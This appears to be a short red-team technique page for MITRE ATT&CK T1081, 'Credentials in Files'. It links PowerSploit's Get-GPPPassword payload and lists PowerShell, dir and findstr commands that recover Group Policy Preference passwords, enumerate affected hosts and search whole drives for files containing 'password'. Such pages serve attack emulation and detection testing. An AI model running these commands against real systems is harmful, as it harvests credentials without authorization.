# Credentials in Files

MITRE ATT&CK Technique: [T1081](https://attack.mitre.org/wiki/Technique/T1081)

## Group Policy Preference

[Payload](Payloads/Get-GPPPassword.ps1)
[PowerSploit Source](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1)

Input:

    Get-GPPPassword -Server EXAMPLE.COM

#retrieve all the computer dns host names a GPP password applies to
    
     PS> Get-DomainOU -GPLink '<GPP_GUID>' | % {Get-DomainComputer -SearchBase $_.distinguishedname -Properties dnshostname}

#using powershell to search file names recursively

    dir -path c:\ -filter *.exe -rec | select fullname -ExpandProperty fullname

#Using dir to search file names recursively

    dir /s /b | findstr -i *.exe

#Using powershell to search in files recursively

    dir -path c:\ -rec -exclude "c:\windows","c:\program files","c:\program files x86" |
    select-string "password"

#Using findstr to search in files recursively

    findstr /s /C:”password" *
